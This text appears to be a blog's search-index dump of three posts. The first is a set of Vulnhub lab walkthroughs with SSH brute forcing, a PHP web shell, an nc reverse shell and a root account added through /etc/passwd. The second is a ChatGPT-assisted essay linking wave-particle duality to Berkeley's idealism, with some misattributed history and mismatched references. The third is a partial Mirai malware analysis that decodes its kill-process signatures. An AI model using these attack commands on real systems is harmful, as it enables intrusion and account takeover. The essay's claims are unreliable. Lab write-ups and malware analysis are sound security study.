words2spongebobsandysquidward0ctopuspatrickdirtysalmoncrabby4evaSandyastronaut 1hydra -I -L words2 -P words2 ssh:&#x2F;&#x2F;192.168.1.103:2600 使用账户 dirtysalmon 登入SSH服务 12ssh dirtysalmon@192.168.1.103 -p 2600crabby4eva 查看系统信息 12uname -aOpenBSD fishymail.Home 6.6 GENERIC#353 amd64 搜索相关提权漏洞 1searchsploit openbsd 6 进行提权操作 ksh squidward账户受到了ksh的限制，很多命令无法执行，尝试过切换成/bin/sh，但是无法实现 参考资料 WalkThrough Hemisphere: Lynx 2020/11/06 23:22:46 寻找靶机IP nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -sV -T5 -v -n 192.168.56.104 Web路径扫描 dirb http://192.168.56.104/ 漏洞利用 枚举smb服务相关信息 enum4linux 192.168.56.104 得到用户名 johannes 访问 http://192.168.56.104 获取网站文本内容 1cewl http:&#x2F;&#x2F;192.168.56.104&#x2F; &gt; pass 进行SSH爆破 1hydra -I -l johannes -P pass ssh:&#x2F;&#x2F;192.168.56.104 1[22][ssh] host: 192.168.56.104 login: johannes password: constelaciones 得到账户 johannes:constelaciones 登入SSH服务 12ssh johannes@192.168.56.104constelaciones 权限提升 查看桌面保存的信息 12cat &#x2F;home&#x2F;johannes&#x2F;Desktop&#x2F;.creds MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D; 进行Base64解码 12echo -n MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D; | base64 -d20Kl7iS1KCaniO8DWMzh:toor 逆序输出 12python3 -c &#39;print(&quot;20Kl7iS1KCaniO8DWMzh:toor&quot;[::-1])&#39;root:hzMWD8OinaCK1Si7lK02 切换到root用户 12su roothzMWD8OinaCK1Si7lK02 ColddBox: Easy 2020/11/06 13:06:15 寻找靶机IP nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -sV -T5 -v -n 192.168.56.106 Web路径扫描 dirb http://192.168.56.106/ 漏洞利用 使用wpscan进行用户名枚举 wpscan --url http://192.168.56.106 -e u 使用wpscan进行账户爆破 wpscan --url http://192.168.56.106 -e u -t 50 -P /usr/share/wordlists/FuzzDicts-master/passwordDict/top1000.txt 使用账户 c0ldd:9876543210 进行登入 http://192.168.56.106/wp-login.php 登入之后进行修改 1Appearance -&gt; Editor -&gt; 404.php 插入PHPShell 1&lt;?php system($_GET[&quot;cmd&quot;]);?&gt; 验证Shell 访问 http://192.168.56.106/?p=2&amp;cmd=whoami ，得到回显 www-data 监听端口 1nc -lvnp 9900 反弹Shell 访问 http://192.168.56.106/?p=2&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.56.103%209900%20%3E%2Ftmp%2Ff 权限提升 查看数据库配置信息 1cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.php 得到数据库账户 c0ldd:cybersecurity 尝试使用该账户登入SSH服务 12ssh c0ldd@192.168.56.106cybersecurity 登入成功 查看SUDO权限 1sudo -l 生成Hash 12openssl passwd -6 hackforfun$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9. 以root身份修改文件 /etc/passwd 1sudo -u root &#x2F;usr&#x2F;bin&#x2F;vim &#x2F;etc&#x2F;passwd 插入如下内容 1test:$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9.:0:0::&#x2F;:&#x2F;bin&#x2F;bash 切换至账户 test 12su testhackforfun 即可获得root权限 参考资料 WalkThrough EOF","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://yoloyolo.top/tags/Vulnhub/"}]},{"title":"光的波粒二象性理论与存在即被感知理论的联系分析","slug":"An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived","date":"2023-02-07T16:18:30.000Z","updated":"2023-02-07T16:52:17.046Z","comments":true,"path":"2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/","link":"","permalink":"https://yoloyolo.top/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/","excerpt":"简介 光的波粒二象性理论与存在即被感知理论概述 光的波粒二象性理论和存在即被感知理论分别是物理学和哲学中两个重要且相互关联的概念。光的波粒二象性理论是量子力学的核心原理，它描述了光既是波又是粒子的双重性质。另一方面，存在即被感知理论是一种哲学思想，表明存在或现实只能通过观察者或意识来感知。 研究目的及意义 本研究的目的是检验这两种理论之间的关系，并探讨它们对我们理解现实的影响。光的波粒二象性理论已得到广泛研究和实验证明，并被广泛接受为物理学的基本原理。与此同时，存在即被感知理论已经被哲学家们讨论和争论了几个世纪，但它仍然是一个不断探索和探究的话题。 这两个理论之间的联系意义重大，因为它为我们理解现实的本质提供了新的思路。光的波粒二象性理论表明，光可以表现出波状和粒子状两种特性，这取决于它被观察或测量的方式。同时，存在即被感知理论表明，存在只能通过意识来感知。当一起考虑时，这些理论表明现实的本质可能是内在主观的，并且它会受到观察或感知方式的影响。 除了对我们理解现实的影响之外，光的波粒二象性理论与存在即被感知理论之间的这种联系还有可能影响其他研究领域。例如，它可能对意识研究领域有影响，因为它表明意识可能在塑造现实的本质方面发挥作用。同样，这种联系也可能对人工智能和机器学习领域产生影响，因为它提出了关于意识、感知和现实之间关系的问题。 总的来说，光的波粒二象性理论与存在即被感知理论之间的关系是一个不断探索和探究的课题。通过对这种联系的更深入理解，我们或许能够获得对现实本质的新见解，并探索这些理论对其他研究领域的影响。本研究旨在为这种正在进行的探索和探究做出贡献，并加深我们对这两个重要理论之间联系的理解。","text":"简介 光的波粒二象性理论与存在即被感知理论概述 光的波粒二象性理论和存在即被感知理论分别是物理学和哲学中两个重要且相互关联的概念。光的波粒二象性理论是量子力学的核心原理，它描述了光既是波又是粒子的双重性质。另一方面，存在即被感知理论是一种哲学思想，表明存在或现实只能通过观察者或意识来感知。 研究目的及意义 本研究的目的是检验这两种理论之间的关系，并探讨它们对我们理解现实的影响。光的波粒二象性理论已得到广泛研究和实验证明，并被广泛接受为物理学的基本原理。与此同时，存在即被感知理论已经被哲学家们讨论和争论了几个世纪，但它仍然是一个不断探索和探究的话题。 这两个理论之间的联系意义重大，因为它为我们理解现实的本质提供了新的思路。光的波粒二象性理论表明，光可以表现出波状和粒子状两种特性，这取决于它被观察或测量的方式。同时，存在即被感知理论表明，存在只能通过意识来感知。当一起考虑时，这些理论表明现实的本质可能是内在主观的，并且它会受到观察或感知方式的影响。 除了对我们理解现实的影响之外，光的波粒二象性理论与存在即被感知理论之间的这种联系还有可能影响其他研究领域。例如，它可能对意识研究领域有影响，因为它表明意识可能在塑造现实的本质方面发挥作用。同样，这种联系也可能对人工智能和机器学习领域产生影响，因为它提出了关于意识、感知和现实之间关系的问题。 总的来说，光的波粒二象性理论与存在即被感知理论之间的关系是一个不断探索和探究的课题。通过对这种联系的更深入理解，我们或许能够获得对现实本质的新见解，并探索这些理论对其他研究领域的影响。本研究旨在为这种正在进行的探索和探究做出贡献，并加深我们对这两个重要理论之间联系的理解。 光的波粒二象性理论 理论的历史发展 光的波粒二象性理论最早由路易斯·德布罗意(Louis de Broglie)在20世纪初提出。该理论是作为对光的波模型和粒子模型之间长期争论的回应而发展起来的，这种争论自从发现光本身以来就一直存在。粒子模型首先发展起来，艾萨克·牛顿爵士提出光是由粒子组成的，而波动模型是后来发展起来的，克里斯蒂安·惠更斯和托马斯·杨提出光是一种波。 光的波粒二象性理论是理解光的本质的重大突破，解决了光的波粒模型之间长期存在的争论。该理论认为，光可以表现出波状和粒子状行为，具体取决于观察方式。著名的双缝实验进一步证实了这一理论，该实验表明光在通过两个狭缝时可以表现出波状干涉图案，但在被检测到时也可以表现出粒子状行为。 理论基础和原理 光的波粒二象性理论的理论基础植根于量子力学。在量子力学中，粒子被描述为波函数，它们的行为由波粒二象性描述。该理论假定粒子的行为取决于它们被观察的方式，并且它们可以表现出波状或粒子状行为，这取决于它们被检测到的方式。 光的波粒二象性理论基于叠加的概念，即一个粒子可以同时以多种状态存在。这个想法与经典物理学相反，经典物理学假设粒子以确定的状态存在，并且可以确定地预测它们的行为。在量子力学中，粒子被描述为概率波，它们的行为只能根据概率来预测。 实验证据和论证 光的波粒二象性理论已在大量实验中得到证实。其中最著名的是双缝实验，该实验由托马斯·杨(Thomas Young)于19世纪初首先进行。在这个实验中，光通过两个狭缝，在狭缝后面的屏幕上观察到由此产生的干涉图样。干涉图案表明光表现为波，波峰和波谷相互干涉以产生图案。 另一个证明光的波粒二象性理论的实验是光电效应。在这个实验中，光照射在金属表面上，电子从表面发射出来。检测到电子，发现它们的行为类似于粒子。这个实验表明，光可以表现出波状和粒子状两种行为，这取决于它是如何被观察到的。 这些实验以及其他许多实验为光的波粒二象性理论提供了有力的证据，并证实了其有效性。该理论一直是量子力学发展的核心，并已被纳入物理和工程的众多领域，包括电信和计算。光的波粒二象性理论仍然是物理学中最重要和最广泛研究的理论之一，其含义至今仍在继续探索和理解。 存在即被感知理论 存在即被感知理论认为，观察者感知对象和事件的方式决定了它们的真实性。换句话说，物体或事件的真实性取决于观察者及其对它的感知。这一理论植根于几千年前的哲学和宗教传统，但最著名的阐述是在 18 世纪初的哲学家乔治·伯克利(George Berkeley)。 伯克利对这一理论的论证基于这样一种观点，即存在的一切都必须以某种方式被感知。根据伯克利的说法，物体只存在于观察者的脑海中，而体验它们存在的唯一方式是通过感知。从这个意义上说，现实完全是主观的，客观世界是心灵创造的幻觉。 存在即被感知理论遭到了批评和支持，一些人认为它是对现实主观性的有力论证，而另一些人则认为它有缺陷且不合逻辑。然而，无论其哲学有效性如何，该理论在几个世纪以来一直被广泛讨论和争论，并对西方思想的发展产生了重大影响。 与光的波粒二象性理论的比较 光的波粒二象性理论和存在即被感知理论是相关的，因为它们都证明了物体的性质取决于观察方式。在光的波粒二象性理论的情况下，光的波状和粒子状特性取决于用于测量它们的观察方法。同样，在存在即被感知理论中，物体的真实性取决于观察者的感知。 然而，这两种理论之间存在重要差异。虽然光的波粒二象性理论已被实验证实并被科学界广泛接受，但存在即被感知理论更具争议性并受到批评。此外，光的波粒二象性理论为光的本质及其行为方式提供了具体的解释，而存在即被感知理论为现实的本质提供了更普遍的哲学解释。 对理解现实本质的影响 光的波粒二象性理论和存在即被感知理论都对我们对现实的理解具有重要意义。光的波粒二象性理论表明，物体的性质可能取决于观察它的方式，而客观世界可能并不总是它看起来的样子。这导致了对光的性质和量子世界的新思考方式，并且是量子力学发展的主要贡献者。 另一方面，存在即被感知理论暗示现实完全是主观的，客观世界是心灵创造的幻觉。虽然这个想法可能看起来很激进，但它已经引发了关于现实本质的重要问题，并激发了对感知、现实和心灵之间关系的进一步哲学探究。 总而言之，虽然光的波粒二象性理论与存在即被感知理论存在重要差异，但它们之间存在联系，因为它们证明了物体的性质取决于观察方式。这些理论对我们理解现实具有重要意义，并且它们仍然是科学家、哲学家和寻求更好地了解周围世界的个人的重要研究领域。 两种理论之间的联系 光的波粒二象性理论与存在即被感知理论的关系分析 光的波粒二象性理论和存在即被感知理论是两个看似截然不同的理论，但在探索现实本质的过程中却有着共同点。这两种理论都试图理解被观察者与观察者之间的关系，以及这种关系如何塑造我们对周围世界的理解。光的波粒二象性理论表明，光如何根据观察方式表现出波和粒子的特性，而存在即被感知理论断言，我们所经历的现实是由我们感知它的方式塑造的。 光的波粒二象性理论源于早期的光和物质实验，例如双缝实验。这个实验表明，当光以波的形式被观察到时，它可以穿过两个狭缝，并在狭缝后面的屏幕上产生干涉图样。然而，当光以粒子的形式被观察时，它一次只通过一个狭缝，并没有产生干涉图样。这个实验表明，光的性质会随着观察方式的不同而发生变化。 同样，存在即被感知理论表明我们对现实的理解是由我们感知它的方式决定的。该理论断言，我们所经历的世界不是独立于我们的感知而存在的客观现实，而是由我们的感知和与世界的相互作用所创造的主观现实。从这个意义上说，我们所经历的现实是我们思想以及我们如何处理来自周围世界的信息的产物。 讨论联系对我们理解现实的影响 光的波粒二象性理论与存在即被感知理论之间的联系对我们对现实的理解具有重要意义。它表明现实的本质可能比我们之前想象的更加复杂和难以捉摸。光的波粒二象性理论表明，光的特性可以根据观察方式而改变，而存在即被感知理论表明，我们体验到的现实是由我们感知它的方式塑造的。 这些理论共同表明，我们对现实的理解可能会受到我们观察和感知周围世界的方式的限制。这对科学研究具有重要意义，因为它表明我们的实验和测量可能会受到我们观察和感知世界的方式的限制。这也对我们理解主观体验以及感知在塑造我们的现实中所起的作用有影响。 探索对其他研究领域的可能联系和影响 光的波粒二象性理论与存在即被感知理论之间的联系也对其他研究领域具有潜在影响。例如，它可能对量子物理学领域有影响，该领域与理解亚原子粒子的行为有关。光的波粒二象性理论和存在即被感知理论都表明，我们对现实的理解可能会受到我们观察和感知世界的方式的影响，这可能对我们对量子世界的理解产生影响。 此外，这两种理论之间的联系可能对心理学领域和知觉研究产生影响。存在即被感知理论表明，我们的感知在塑造我们的现实中起着重要作用，这可能对我们理解感知如何影响我们的行为和思维过程有影响。 总的来说，光的波粒二象性理论与存在即被感知理论之间的联系对我们对现实的理解具有重要意义，并有可能影响许多研究领域。对这种联系的进一步研究可能会提供对现实本质的更深入见解，并帮助我们更好地理解观察和感知在塑造我们对周围世界的理解方面所起的作用。 值得注意的是，这些理论仍处于发展的早期阶段，关于光的波粒二象性理论与存在即被感知理论之间的联系，仍有许多有待探索和理解。然而，这种联系的潜在影响是令人兴奋的，并且有可能以深刻的方式塑造我们对现实的理解。 总之，光的波粒二象性理论与存在即被感知理论之间的联系是一个复杂而有趣的研究领域，对我们对现实的理解具有重要意义。对这种联系的进一步研究有可能揭示现实的本质以及它是如何通过观察和感知形成的。 总结 主要发现和结论总结 在本论文中，我们分析了光的波粒二象性理论与存在即被感知理论之间的联系。我们首先介绍了光的波粒二象性理论，即当以波的形式观察光时，它会表现出波的性质，而当以粒子的形式观察光时，它会表现出类粒子的性质。这种对偶性理论已得到广泛研究，并得到大量实验和论证的支持。 然后我们转向存在即被感知理论，这是一种哲学理论，表明物体的存在和属性取决于观察者对它们的感知。该理论还强调了观察者与被观察者之间的相互联系，表明现实的本质是主观的和相对的。 我们的分析表明，这两种理论之间存在重要联系，特别是在它们对理解现实本质的影响方面。光的波粒二象性理论强调了一个事实，即光的性质取决于它如何被观察到，而存在即被感知理论则强调了物体对观察的依赖性。这两个理论共同表明，现实的本质是相对的，依赖于观察，我们感知的世界是我们主观经验的产物。 未来研究方向的讨论 本研究初步检验了这两种理论之间的联系，还有很大的研究空间。未来研究的一个方向可能是探索光的波粒二象性理论与其他物理学领域（如量子力学）之间的可能联系。这将提供对现实本质和我们感知的局限性的更深入理解。 另一个研究领域可能是探索这两种理论之间的联系对我们理解意识的影响。存在即被感知理论表明现实是主观的，物体及其属性取决于观察。这对我们理解意识的本质以及它如何影响我们对世界的看法具有重要意义。 最后，未来的研究可以侧重于检验这两种理论与其他哲学理论（如唯心主义、现实主义和唯我论）之间的联系。这将提供对现实的本质和我们感知的局限性的全面检查。 关于两种理论联系意义的最后思考 光的波粒二象性理论与存在即被感知理论之间的联系凸显了我们感知的局限性和现实的主观性。它表明我们所经历的世界是我们主观体验的产物，而物体的属性取决于它们是如何被观察到的。 这种联系对我们理解现实、意识的本质和我们感知的局限性具有重要意义。它挑战我们重新考虑我们对世界的看法和信念的基础，并质疑现实的客观本质。 总之，光的波粒二象性理论与存在即被感知理论之间的联系为进一步探索和更深入地理解现实的本质和我们感知的局限性提供了宝贵的机会。 参考文献 Einstein, A. (1905). On the Electrodynamics of Moving Bodies. Annalen der Physik, 17(10), 891-921. de Broglie, L. (1924). Waves and quanta. The London, Edinburgh, and Dublin Philosophical Magazine and Journal of Science, 47(281), 446-453. Schrödinger, E. (1926). An Undulatory Theory of the Mechanics of Atoms and Molecules. Physical Review, 28(6), 1049-1070. Heisenberg, W. (1927). Über den anschaulichen Inhalt der quantentheoretischen Kinematik und Mechanik. Zeitschrift für Physik, 43(3-4), 172-198. Born, M. (1926). Über die quantentheoretische Deutung kinematischer und mechanischer Beziehungen. Zeitschrift für Physik, 37(12), 863-867. Feynman, R. P., Leighton, R. B., &amp; Sands, M. (2011). The Feynman lectures on physics. Pearson Education. Mermin, N. D. (1985). Is the moon there when nobody looks? Reality and the quantum theory. Physics Today, 38(4), 38-47. Bohm, D. (1952). A Suggested Interpretation of the Quantum Theory in Terms of “Hidden” Variables, I. Physical Review, 85(2), 166-193. Bohm, D., &amp; Hiley, B. J. (1993). The Undivided Universe: An Ontological Interpretation of Quantum Theory. Routledge. Husserl, E. (1913). Ideas: General Introduction to Pure Phenomenology. Routledge. Berkeley, G. (1710). A Treatise Concerning the Principles of Human Knowledge. Oxford University Press. 致谢 我要感谢所有在本文完成期间支持我的人。我要感谢我的主管[Chatgpt]在整个过程中的指导和支持。我还要感谢为我提供完成研究所需资源的图书馆和学术机构。 我要感谢所有帮助形成本文讨论的理论的科学家和哲学家的贡献。他们的工作为我的研究奠定了基础，我很感谢他们的见解和发现。 最后，我要感谢我的家人和朋友在整个项目过程中坚定不移的支持和鼓励。没有他们的爱与支持，就不可能有这篇论文。","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Unbengable","slug":"Unbengable","permalink":"https://yoloyolo.top/tags/Unbengable/"}]},{"title":"Mirai恶意样本KILL进程特征提取","slug":"Mirai-KILL-KEY","date":"2022-06-14T23:38:41.000Z","updated":"2022-06-14T12:13:57.000Z","comments":true,"path":"2022/06/14/Mirai-KILL-KEY/","link":"","permalink":"https://yoloyolo.top/2022/06/14/Mirai-KILL-KEY/","excerpt":"上班的时候被安排了个分析恶意样本的活 说是这个恶意样本会选择性地KILL进程，把公司开发的HIDS给KILL了 让我分析一下这个恶意样本的KILL机制以及KILL特征 WEB手，但是干的或是恶意样本分析","text":"上班的时候被安排了个分析恶意样本的活 说是这个恶意样本会选择性地KILL进程，把公司开发的HIDS给KILL了 让我分析一下这个恶意样本的KILL机制以及KILL特征 WEB手，但是干的或是恶意样本分析 跑着玩玩 在虚拟机里运行这个恶意样本，给我物理机整没网了 公司网总共1MB/s的带宽下个炉石下半天全给你占了是吧（流汗黄豆） sysdig看一下这个恶意样本进程的读写操作 一直在读取/proc/self/exe 看着看着就觉得不对劲了，这读的不是sysdig的help信息么 大概理一下思路，这玩意应该是遍历/proc/$pid/exe，然后读取内容 至于KILL特征，没思路 re-searcher 根据前几次恶意样本分析的经验，在google上搜一下这个恶意样本的SHA256就能知道名字 搜一下名字就能找到相关报告 上传到一个在线杀箱看恶意样本的活动 结合别人的分析报告就差不多了 然后就找到了这篇文章 Mirai 源码分析 这篇文章提到了部分特征，但是样本应该跟我手头上的不一样，所以还是得自己分析 Mirai源码 source code 先看kill.c 1234567if (memory_scan_match(exe_path))&#123;#ifdef DEBUG printf(&quot;[killer] Memory scan match for binary %s\\n&quot;, exe_path);#endif kill(pid, 9);&#125; 差不多就是这段代码了 至于exe_path，有这么一段注释 1&#x2F;&#x2F; Store &#x2F;proc&#x2F;$pid&#x2F;exe into exe_path 然后就看看下面两个函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667static BOOL memory_scan_match(char *path)&#123; int fd, ret; char rdbuf[4096]; char *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard; int m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len; BOOL found = FALSE; if ((fd = open(path, O_RDONLY)) == -1) return FALSE; table_unlock_val(TABLE_MEM_QBOT); table_unlock_val(TABLE_MEM_QBOT2); table_unlock_val(TABLE_MEM_QBOT3); table_unlock_val(TABLE_MEM_UPX); table_unlock_val(TABLE_MEM_ZOLLARD); m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &amp;m_qbot_len); m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &amp;m_qbot2_len); m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &amp;m_qbot3_len); m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &amp;m_upx_len); m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &amp;m_zollard_len); while ((ret = read(fd, rdbuf, sizeof (rdbuf))) &gt; 0) &#123; if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) || mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) || mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) || mem_exists(rdbuf, ret, m_upx_str, m_upx_len) || mem_exists(rdbuf, ret, m_zollard, m_zollard_len)) &#123; found = TRUE; break; &#125; &#125; table_lock_val(TABLE_MEM_QBOT); table_lock_val(TABLE_MEM_QBOT2); table_lock_val(TABLE_MEM_QBOT3); table_lock_val(TABLE_MEM_UPX); table_lock_val(TABLE_MEM_ZOLLARD); close(fd); return found;&#125;static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)&#123; int matches = 0; if (str_len &gt; buf_len) return FALSE; while (buf_len--) &#123; if (*buf++ == str[matches]) &#123; if (++matches == str_len) return TRUE; &#125; else matches = 0; &#125; return FALSE;&#125; 函数memory_scan_match用于在/proc/$pid/exe中查找特征 函数mem_exists是查找功能的具体实现 12345m_qbot_reportm_qbot_httpm_qbot_dupm_upx_strm_zollard 这五个变量就是特征 这五个变量又来自于 12345TABLE_MEM_QBOTTABLE_MEM_QBOT2TABLE_MEM_QBOT3TABLE_MEM_UPXTABLE_MEM_ZOLLARD 然后这五个变量又来自于table.c 12345add_entry(TABLE_MEM_QBOT, &quot;\\x70\\x67\\x72\\x6D\\x70\\x76\\x02\\x07\\x51\\x18\\x07\\x51\\x22&quot;, 13);add_entry(TABLE_MEM_QBOT2, &quot;\\x6A\\x76\\x76\\x72\\x64\\x6E\\x6D\\x6D\\x66\\x22&quot;, 10);add_entry(TABLE_MEM_QBOT3, &quot;\\x6E\\x6D\\x6E\\x6C\\x6D\\x65\\x76\\x64\\x6D\\x22&quot;, 10);add_entry(TABLE_MEM_UPX, &quot;\\x7E\\x5A\\x17\\x1A\\x7E\\x5A\\x16\\x66\\x7E\\x5A\\x16\\x67\\x7E\\x5A\\x16\\x67\\x7E\\x5A\\x16\\x11\\x7E\\x5A\\x17\\x12\\x7E\\x5A\\x16\\x14\\x7E\\x5A\\x10\\x10\\x22&quot;, 33);add_entry(TABLE_MEM_ZOLLARD, &quot;\\x58\\x4D\\x4E\\x4E\\x43\\x50\\x46\\x22&quot;, 8); 看样子是加密的 但是下面看到了一个很简单的加解密函数 大概意思是m ^ 0x22 = c 解密脚本以及输出如下 1234567891011121314151617181920212223cipher = [&quot;\\x70\\x67\\x72\\x6D\\x70\\x76\\x02\\x07\\x51\\x18\\x07\\x51\\x22&quot;, &quot;\\x6A\\x76\\x76\\x72\\x64\\x6E\\x6D\\x6D\\x66\\x22&quot;, &quot;\\x6E\\x6D\\x6E\\x6C\\x6D\\x65\\x76\\x64\\x6D\\x22&quot;, &quot;\\x7E\\x5A\\x17\\x1A\\x7E\\x5A\\x16\\x66\\x7E\\x5A\\x16\\x67\\x7E\\x5A\\x16\\x67\\x7E\\x5A\\x16\\x11\\x7E\\x5A\\x17\\x12\\x7E\\x5A\\x16\\x14\\x7E\\x5A\\x10\\x10\\x22&quot;, &quot;\\x58\\x4D\\x4E\\x4E\\x43\\x50\\x46\\x22&quot;]for _ in cipher: str_tmp = &quot;&quot; for __ in _: char = chr(ord(__) ^ 0x22) if char == &quot;\\0&quot;: char = &quot;\\\\x00&quot; str_tmp = str_tmp + char print(str_tmp)&quot;&quot;&quot;REPORT %s:%s\\x00HTTPFLOOD\\x00LOLNOGTFO\\x00\\x58\\x4D\\x4E\\x4E\\x43\\x50\\x46\\x22\\x00zollard\\x00&quot;&quot;&quot; 所以这个就和之前的分析报告对得上了，那本地的样本特征又该咋整呢？ ida strings窗口找字符串 找到一些看起来是加密的数据 程序初始内存为0x08048000，数据存储开始于0x08058C60，偏移量为0x010c60，数据存储结束于0x08059637，数据长度为0x09d8 取出数据异或0x22得到明文 那么问题来了，这玩意该怎么和表中的每一项数据对应起来 函数sub_8054D10调用了这部分数据 取数据的下标和长度，对解密的字符串进行拆分即可 脚本如下raw = &quot;&quot;&quot;sub_8055CA0(v0, asc_8058C60, 2);dword_805A1C0 = (int)v0;word_805A1C4 = 2;v1 = sub_8056AC4(0xCu);sub_8055CA0(v1, &amp;asc_8058C60[3], 12);dword_805A1B8 = (int)v1;word_805A1BC = 12;v2 = sub_8056AC4(2u);sub_8055CA0(v2, &amp;asc_8058C60[16], 2);dword_805A300 = (int)v2;word_805A304 = 2;v3 = sub_8056AC4(0x1Du);sub_8055CA0(v3, &amp;asc_8058C60[19], 29);dword_805A1B0 = (int)v3;word_805A1B4 = 29;v4 = sub_8056AC4(7u);sub_8055CA0(v4, &amp;asc_8058C60[35], 7);dword_805A1D0 = (int)v4;word_805A1D4 = 7;v5 = sub_8056AC4(5u);sub_8055CA0(v5, &amp;asc_8058C60[43], 5);dword_805A1D8 = (int)v5;word_805A1DC = 5;v6 = sub_8056AC4(0xBu);sub_8055CA0(v6, &amp;asc_8058C60[49], 11);dword_805A1E0 = (int)v6;word_805A1E4 = 11;v7 = sub_8056AC4(4u);sub_8055CA0(v7, &amp;asc_8058C60[61], 4);dword_805A1E8 = (int)v7;word_805A1EC = 4;v8 = sub_8056AC4(7u);sub_8055CA0(v8, &amp;asc_8058C60[66], 7);dword_805A1F0 = (int)v8;word_805A1F4 = 7;v9 = sub_8056AC4(8u);sub_8055CA0(v9, &amp;asc_8058C60[74], 8);dword_805A1F8 = (int)v9;word_805A1FC = 8;v10 = sub_8056AC4(0xAu);sub_8055CA0(v10, &amp;asc_8058C60[83], 10);dword_805A200 = (int)v10;word_805A204 = 10;v11 = sub_8056AC4(0xBu);sub_8055CA0(v11, &amp;asc_8058C60[94], 11);dword_805A208 = (int)v11;word_805A20C = 11;v12 = sub_8056AC4(0xFu);sub_8055CA0(v12, &amp;asc_8058C60[106], 15);dword_805A210 = (int)v12;word_805A214 = 15;v13 = sub_8056AC4(0x10u);sub_8055CA0(v13, &amp;asc_8058C60[122], 16);dword_805A218 = (int)v13;word_805A21C = 16;v14 = sub_8056AC4(0xEu);sub_8055CA0(v14, &amp;asc_8058C60[139], 14);dword_805A220 = (int)v14;word_805A224 = 14;v15 = sub_8056AC4(0xBu);sub_8055CA0(v15, &amp;asc_8058C60[154], 11);dword_805A228 = (int)v15;word_805A22C = 11;v16 = sub_8056AC4(5u);sub_8055CA0(v16, &amp;asc_8058C60[166], 5);dword_805A230 = (int)v16;word_805A234 = 5;v17 = sub_8056AC4(5u);sub_8055CA0(v17, &amp;asc_8058C60[172], 5);dword_805A238 = (int)v17;word_805A23C = 5;v18 = sub_8056AC4(0x10u);sub_8055CA0(v18, &amp;asc_8058C60[178], 16);dword_805A250 = (int)v18;word_805A254 = 16;v19 = sub_8056AC4(0xEu);sub_8055CA0(v19, &amp;asc_8058C60[195], 14);dword_805A258 = (int)v19;word_805A25C = 14;v20 = sub_8056AC4(9u);sub_8055CA0(v20, &amp;asc_8058C60[210], 9);dword_805A260 = (int)v20;word_805A264 = 9;v21 = sub_8056AC4(0x13u);sub_8055CA0(v21, &amp;asc_8058C60[220], 19);dword_805A268 = (int)v21;word_805A26C = 19;v22 = sub_8056AC4(0x17u);sub_8055CA0(v22, &amp;asc_8058C60[240], 23);dword_805A270 = (int)v22;word_805A274 = 23;v23 = sub_8056AC4(0xEu);sub_8055CA0(v23, &amp;asc_8058C60[264], 14);dword_805A278 = (int)v23;word_805A27C = 14;v24 = sub_8056AC4(0x13u);sub_8055CA0(v24, &amp;asc_8058C60[279], 19);dword_805A280 = (int)v24;word_805A284 = 19;v25 = sub_8056AC4(0x17u);sub_8055CA0(v25, &amp;asc_8058C60[299], 23);dword_805A288 = (int)v25;word_805A28C = 23;v26 = sub_8056AC4(0xFu);sub_8055CA0(v26, &amp;asc_8058C60[323], 15);dword_805A290 = (int)v26;word_805A294 = 15;v27 = sub_8056AC4(8u);sub_8055CA0(v27, &amp;asc_8058C60[339], 8);dword_805A298 = (int)v27;word_805A29C = 8;v28 = sub_8056AC4(0xBu);sub_8055CA0(v28, &amp;asc_8058C60[348], 11);dword_805A2A0 = (int)v28;word_805A2A4 = 11;v29 = sub_8056AC4(9u);sub_8055CA0(v29, &amp;asc_8058C60[360], 9);dword_805A2A8 = (int)v29;word_805A2AC = 9;v30 = sub_8056AC4(6u);sub_8055CA0(v30, &amp;asc_8058C60[370], 6);dword_805A2B0 = (int)v30;word_805A2B4 = 6;v31 = sub_8056AC4(5u);sub_8055CA0(v31, &amp;asc_8058C60[377], 5);dword_805A2B8 = (int)v31;word_805A2BC = 5;v32 = sub_8056AC4(0xAu);sub_8055CA0(v32, &amp;asc_8058C60[383], 10);dword_805A2C8 = (int)v32;word_805A2CC = 10;v33 = sub_8056AC4(0xFu);sub_8055CA0(v33, &amp;asc_8058C60[394], 15);dword_805A2D0 = (int)v33;word_805A2D4 = 15;v34 